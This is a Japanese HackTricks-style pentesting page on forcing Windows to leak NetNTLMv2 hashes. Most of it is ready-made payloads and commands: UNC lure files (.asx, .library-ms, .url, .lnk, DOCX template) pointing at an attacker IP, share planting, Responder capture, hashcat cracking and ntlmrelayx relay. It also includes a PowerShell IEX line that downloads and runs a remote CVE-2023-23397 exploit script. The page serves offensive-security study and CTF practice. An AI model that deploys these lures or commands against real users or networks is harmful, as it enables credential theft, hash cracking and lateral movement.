# NTLM credsを盗む場所

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) の素晴らしいアイデア、Microsoft Wordファイルのオンラインダウンロードから ntlm leaks source までの情報をすべて確認してください: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md および [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### 書き込み可能な SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Explorer でユーザーや scheduled jobs が参照する share に**書き込める**場合、メタデータがあなたの UNC を指すファイル（例: `\\ATTACKER\share`）を配置します。フォルダの描画時に **implicit SMB authentication** が発生し、**NetNTLMv2** がリスナーに漏れます。

1. **lures を生成**します（SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. を対象）
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **writable share に置く**（被害者が開く任意のフォルダ）:
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows は複数のファイルに一度にアクセスすることがあります。Explorer がプレビューするもの（`BROWSE TO FOLDER`）はクリック不要です。

### Windows Media Player playlists (.ASX/.WAX)

ターゲットに、あなたが制御する Windows Media Player playlist を開かせる、またはプレビューさせられれば、エントリを UNC path に向けることで Net‑NTLMv2 を leak できます。WMP は参照された media を SMB 経由で取得しようとし、暗黙的に authenticate します。

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Collection and cracking flow:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIPに埋め込まれた .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer は、ZIPアーカイブ内から直接開かれた .library-ms ファイルを安全でない形で処理します。ライブラリ定義がリモートの UNC パス（例: \\attacker\share）を指している場合、ZIP 内の .library-ms を単に閲覧/起動するだけで、Explorer はその UNC を列挙し、攻撃者に NTLM 認証を送信します。これにより、オフラインでクラック可能、または場合によってはリレー可能な NetNTLMv2 が得られます。

攻撃者の UNC を指す最小限の .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- XML above を使って .library-ms ファイルを作成する（IP/hostname を設定する）。
- それを zip する（Windows: Send to → Compressed (zipped) folder）し、ZIP を target に渡す。
- NTLM capture listener を起動し、victim が ZIP の中から .library-ms を開くのを待つ。


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows は、calendar items 内の拡張 MAPI property PidLidReminderFileParameter を処理していた。もしその property が UNC path（例: \\attacker\share\alert.wav）を指していると、Outlook は reminder が発火したときに SMB share に接続し、ユーザーの Net‑NTLMv2 をクリックなしで leak してしまう。これは 2023 年 3 月 14 日に patch されたが、legacy/untouched fleets や historical incident response では今でも非常に relevant である。

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener側:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 被害者は、リマインダーが発火する際に Outlook for Windows が実行中である必要があるだけ。
- この leak では Net‑NTLMv2 が得られ、オフラインでの cracking または relay に適している（pass‑the‑hash ではない）。


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer は shortcut icons を自動的に描画する。最近の研究では、UNC‑icon shortcuts に対する Microsoft の 2025年4月の patch 後でも、shortcut target を UNC path 上に置き、icon をローカルに保つことで、click なしで NTLM authentication を引き起こせることが示された（patch bypass は CVE‑2025‑50154 として割り当て）。単にフォルダを表示するだけで、Explorer は remote target から metadata を取得し、attacker の SMB server に NTLM を送信する。

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShellによるProgram Shortcut payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
### Delivery ideas
- ショートカットを ZIP に入れて、被害者に閲覧させる。
- 被害者が開く書き込み可能な share にショートカットを置く。
- 同じフォルダ内の他の lure files と組み合わせて、Explorer にアイテムをプレビューさせる。

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows は `.lnk` のメタデータを **view/preview**（アイコン描画）時に読み込み、実行時だけではない。CVE‑2026‑25185 は、**ExtraData** ブロックが shell に icon path を解決させ、**load 中**に filesystem に触れ、path が remote の場合に outbound NTLM を送出する parsing path を示している。

主な trigger conditions (`CShellLink::_LoadFromStream` で観測):
- ExtraData に **DARWIN_PROPS** (`0xa0000006`) を含める（icon update routine への gate）。
- **TargetUnicode** が入った **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) を含める。
- loader は `TargetUnicode` 内の environment variables を展開し、結果の path に対して `PathFileExistsW` を呼び出す。

`TargetUnicode` が UNC path（例: `\\attacker\share\icon.ico`）に解決される場合、ショートカットを含む folder を**見るだけ**で outbound authentication が発生する。同じ load path は **indexing** や **AV scanning** でも到達可能で、実用的な no-click leak surface になる。

これらの構造を Windows GUI を使わずに作成・確認するための research tooling（parser/generator/UI）は **LnkMeMaybe** project で利用できる。


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

ネイティブの **WebDAV client** は、現在の logon session を任意の **HTTP/WebDAV** endpoint へ authenticate させるために悪用できる:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
これが有用な理由:
- **攻撃者が制御する WebDAV サーバー**に対して、カスタムクライアントを配置せずに **HTTP 経由の NTLM** を引き起こせる。
- **内部ホスト**に対しては、lateral movement の前に **盗まれた認証情報がどこで受け入れられるかを検証**する静かな方法になる。
- **SMB egress がフィルタリング**されていても **HTTP/WebDAV** が到達可能なら、このコマンドは良い代替手段になる。

運用上の注意:
- **WebClient** サービスが送信元ホストで実行されている必要がある。
- `rundll32.exe` は `davclnt.dll` を読み込み、**現在のユーザーの認証情報**を使って Windows に WebDAV authentication を処理させる。
- 自分が管理する infrastructure を指す場合は、NTLM 対応の HTTP listener/relay を使う。たとえば:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
検知の観点では、多数の内部システムに対する繰り返しの `rundll32.exe davclnt.dll,DavSetCookie` 実行は、通常のユーザー行動というより **credential validation / spray-like lateral movement prep** の強いシグナルです。

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels を編集し、rId1337 をあなたの UNC に向ける:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx に再パックして配布する。SMB capture listener を実行して、open を待つ。

relay や NTLM の abuse に関する capture 後のアイデアは、こちらを参照:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE-2025-24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
